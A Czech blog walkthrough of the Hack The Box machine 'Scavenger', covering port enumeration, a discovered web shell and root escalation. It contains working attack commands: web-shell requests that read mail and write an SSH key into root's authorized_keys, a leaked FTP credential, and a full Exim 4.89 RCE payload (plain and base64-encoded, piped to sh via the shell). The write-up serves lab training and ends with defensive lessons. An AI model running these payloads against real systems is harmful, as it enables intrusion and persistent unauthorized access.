---
layout: post
author: Tomáš Matějíček
title: "Scavenger"
date: 2021-01-09
tags: linux rce ssh php exploit enumeration
---

## Úvod a kontext

Scavenger je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
25/tcp open  smtp    Exim smtpd 4.89
| smtp-commands: ib01.supersechosting.htb Hello ib01.supersechosting.htb [10.10.14.9], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP,
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
43/tcp open  whois?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
[... výstup zkrácen ...]
SF:\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://ww
SF:w\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x
SF:20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_genera
SF:l_ci,COERCIBLE\)\x20for\x20operation\x20'like'")%r(TLSSessionReq,103,"%
SF:\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\
SF:n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20
SF:http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mi
SF:x\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(ut
SF:f8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vyhledání otevřených portů (2)

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
nmap -sU -T4 -v $IP
```
```
=> http://www.supersechosting.htb/
```

### Enumerace webu

Ve webové vrstvě hledám neveřejné cesty, vývojové artefakty a chybně vystavené soubory, protože právě ty často prozradí technologii aplikace, interní workflow nebo přímo přístupové údaje.
```bash
./dirsearch.py -u http://sec03.rentahacker.htb/ -e php
```
```
=> sec03.rentahacker.htb/shell.php
```

## Získání přístupu

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```bash
view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/*
```

### Přihlášení na cíl

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;ls+-alh+/root/.ssh/"
```

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```bash
curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;echo+\"ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8%2BQR3hnONfIO2Y%2FvhoVRgVDpeOUrpxa%2BEOnRNhAV9%2FdYNoi%__CENSORED__%2BzcpGO0MLPiuEl78INxwii7y94CAn1gl%__CENSORED__%2FptFIFGVukajnihbK%2Fb3uWCDtaJcgaSILoSomouxjfXqmAwj%2FTaM0qHsT7K9NZsPfOB5ZAXa2spPR%2BAGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl%__CENSORED__%2FtFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw%2BppfkBwBIs1Q%3D%3D+hack@t\"+>+/root/.ssh/authorized_keys"
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.

```text
ftp ib01.supersechosting.htb ib01c01/GetYouAH4t!
=> user.txt: 6f8a8a832ea8182fddf1da903dcc804d

Scavenger-exim-exploit
https://www.exploit-db.com/exploits/46996
touch /dev/shm/flag;(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Froot\x2Froot.txt\x3E\x2Fdev\x2Fshm\x2Fflag\x22}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25
```

## Eskalace oprávnění

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.

Následující úsek zachycuje i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.

```text
ftp ib01.supersechosting.htb ib01c01/GetYouAH4t!
=> user.txt: 6f8a8a832ea8182fddf1da903dcc804d

Scavenger-exim-exploit
https://www.exploit-db.com/exploits/46996
touch /dev/shm/flag;(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Froot\x2Froot.txt\x3E\x2Fdev\x2Fshm\x2Fflag\x22}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25

base64 -w 0 Scavenger-exim-exploit
dG91Y2ggL2Rldi9zaG0vZmxhZzsoc2xlZXAgMC4xIDsgZWNobyBIRUxPIGZvbyA7IHNsZWVwIDAuMSA7IGVjaG8gJ01BSUwgRlJPTTo8PicgOyBzbGVlcCAwLjEgOyBlY2hvICdSQ1BUIFRPOjwke3J1bntceDJGYmluXHgyRnNoXHgwOS1jXHgwOVx4MjJjYXRceDA5XHgyRnJvb3RceDJGcm9vdC50eHRceDNFXHgzRVx4MkZkZXZceDJGc2htXHgyRmZsYWdceDIyfX1AbG9jYWxob3N0PicgOyBzbGVlcCAwLjEgOyBlY2hvIERBVEEgOyBzbGVlcCAwLjEgOyBlY2hvICJSZWNlaXZlZDogMSIgOyBlY2hvICJSZWNlaXZlZDogMiIgO2VjaG8gIlJlY2VpdmVkOiAzIiA7ZWNobyAiUmVjZWl2ZWQ6IDQiIDtlY2hvICJSZWNlaXZlZDogNSIgO2VjaG8gIlJlY2VpdmVkOiA2IiA7ZWNobyAiUmVjZWl2ZWQ6IDciIDtlY2hvICJSZWNlaXZlZDogOCIgO2VjaG8gIlJlY2VpdmVkOiA5IiA7ZWNobyAiUmVjZWl2ZWQ6IDEwIiA7ZWNobyAiUmVjZWl2ZWQ6IDExIiA7ZWNobyAiUmVjZWl2ZWQ6IDEyIiA7ZWNobyAiUmVjZWl2ZWQ6IDEzIiA7ZWNobyAiUmVjZWl2ZWQ6IDE0IiA7ZWNobyAiUmVjZWl2ZWQ6IDE1IiA7ZWNobyAiUmVjZWl2ZWQ6IDE2IiA7ZWNobyAiUmVjZWl2ZWQ6IDE3IiA7ZWNobyAiUmVjZWl2ZWQ6IDE4IiA7ZWNobyAiUmVjZWl2ZWQ6IDE5IiA7ZWNobyAiUmVjZWl2ZWQ6IDIwIiA7ZWNobyAiUmVjZWl2ZWQ6IDIxIiA7ZWNobyAiUmVjZWl2ZWQ6IDIyIiA7ZWNobyAiUmVjZWl2ZWQ6IDIzIiA7ZWNobyAiUmVjZWl2ZWQ6IDI0IiA7ZWNobyAiUmVjZWl2ZWQ6IDI1IiA7ZWNobyAiUmVjZWl2ZWQ6IDI2IiA7ZWNobyAiUmVjZWl2ZWQ6IDI3IiA7ZWNobyAiUmVjZWl2ZWQ6IDI4IiA7ZWNobyAiUmVjZWl2ZWQ6IDI5IiA7ZWNobyAiUmVjZWl2ZWQ6IDMwIiA7ZWNobyAiUmVjZWl2ZWQ6IDMxIiA7ZWNobyAiIiA7IGVjaG8gIi4iIDsgZWNobyBRVUlUKSB8IG5jIDEyNy4wLjAuMSAyNQo=
curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+dG91Y2ggL2Rldi9zaG0vZmxhZzsoc2xlZXAgMC4xIDsgZWNobyBIRUxPIGZvbyA7IHNsZWVwIDAuMSA7IGVjaG8gJ01BSUwgRlJPTTo8PicgOyBzbGVlcCAwLjEgOyBlY2hvICdSQ1BUIFRPOjwke3J1bntceDJGYmluXHgyRnNoXHgwOS1jXHgwOVx4MjJjYXRceDA5XHgyRnJvb3RceDJGcm9vdC50eHRceDNFXHgzRVx4MkZkZXZceDJGc2htXHgyRmZsYWdceDIyfX1AbG9jYWxob3N0PicgOyBzbGVlcCAwLjEgOyBlY2hvIERBVEEgOyBzbGVlcCAwLjEgOyBlY2hvICJSZWNlaXZlZDogMSIgOyBlY2hvICJSZWNlaXZlZDogMiIgO2VjaG8gIlJlY2VpdmVkOiAzIiA7ZWNobyAiUmVjZWl2ZWQ6IDQiIDtlY2hvICJSZWNlaXZlZDogNSIgO2VjaG8gIlJlY2VpdmVkOiA2IiA7ZWNobyAiUmVjZWl2ZWQ6IDciIDtlY2hvICJSZWNlaXZlZDogOCIgO2VjaG8gIlJlY2VpdmVkOiA5IiA7ZWNobyAiUmVjZWl2ZWQ6IDEwIiA7ZWNobyAiUmVjZWl2ZWQ6IDExIiA7ZWNobyAiUmVjZWl2ZWQ6IDEyIiA7ZWNobyAiUmVjZWl2ZWQ6IDEzIiA7ZWNobyAiUmVjZWl2ZWQ6IDE0IiA7ZWNobyAiUmVjZWl2ZWQ6IDE1IiA7ZWNobyAiUmVjZWl2ZWQ6IDE2IiA7ZWNobyAiUmVjZWl2ZWQ6IDE3IiA7ZWNobyAiUmVjZWl2ZWQ6IDE4IiA7ZWNobyAiUmVjZWl2ZWQ6IDE5IiA7ZWNobyAiUmVjZWl2ZWQ6IDIwIiA7ZWNobyAiUmVjZWl2ZWQ6IDIxIiA7ZWNobyAiUmVjZWl2ZWQ6IDIyIiA7ZWNobyAiUmVjZWl2ZWQ6IDIzIiA7ZWNobyAiUmVjZWl2ZWQ6IDI0IiA7ZWNobyAiUmVjZWl2ZWQ6IDI1IiA7ZWNobyAiUmVjZWl2ZWQ6IDI2IiA7ZWNobyAiUmVjZWl2ZWQ6IDI3IiA7ZWNobyAiUmVjZWl2ZWQ6IDI4IiA7ZWNobyAiUmVjZWl2ZWQ6IDI5IiA7ZWNobyAiUmVjZWl2ZWQ6IDMwIiA7ZWNobyAiUmVjZWl2ZWQ6IDMxIiA7ZWNobyAiIiA7IGVjaG8gIi4iIDsgZWNobyBRVUlUKSB8IG5jIDEyNy4wLjAuMSAyNQo=|base64+-d|sh"
curl "http://sec03.rentahacker.htb/shell.php?hidden=cat+/dev/shm/flag"

=> root.txt: 4a08d8174e9ec22b01d91ddb9a732b17

Scavenger-exim-exploit-2
touch /dev/shm/flag;(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Fopt\x2Fwhois\x2Fwhois.py\x3E\x3E\x2Fdev\x2Fshm\x2Fflag\x22}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25

(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Fopt\x2Fwhois\x2Fwhois.py\x3E\x3E\x2Fdev\x2Fshm\x2Fflag\x22}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc sec03.rentahacker.htb 25
```

## Shrnutí klíčových poznatků

- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Finální část ukazuje, že po získání shellu je nutné systematicky hledat slabé delegace oprávnění, uložená tajemství a automatizované procesy.

## Co si odnést do praxe

- Ve webové vrstvě je důležité omezit úniky citlivých souborů, testovacích endpointů a vývojových artefaktů, protože často slouží jako odrazový můstek k dalším službám.
- Přístupové údaje je potřeba oddělovat mezi službami a minimalizovat jejich opětovné použití, jinak se z jedné slabiny rychle stane plnohodnotný vstup do systému.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.
- Stejné techniky mají smysl pouze v laboratorním nebo jinak autorizovaném testovacím prostředí.
